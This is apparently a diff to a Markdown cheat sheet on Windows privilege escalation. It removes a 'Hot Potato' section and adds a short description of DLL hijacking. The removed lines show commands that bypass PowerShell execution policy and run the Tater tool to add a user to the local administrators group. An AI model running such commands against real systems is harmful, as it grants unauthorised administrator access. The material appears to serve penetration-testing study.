@@ -16,15 +16,8 @@ Misc
 
 <!-- -->
 
-### Hot Potato
-cmd:
-- `powershell.exe -nop -ep bypass`
-<!-- -->
-
-Powershell
-- `Import-Module  C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
-- `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
-
+### DLL Hijacking
+DLL hijacking is an technique that can allow you to inject code into an application by replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run.
 ### Winpeas.exe
 Local:
 - `python -m SimpleHTTPServer 80`
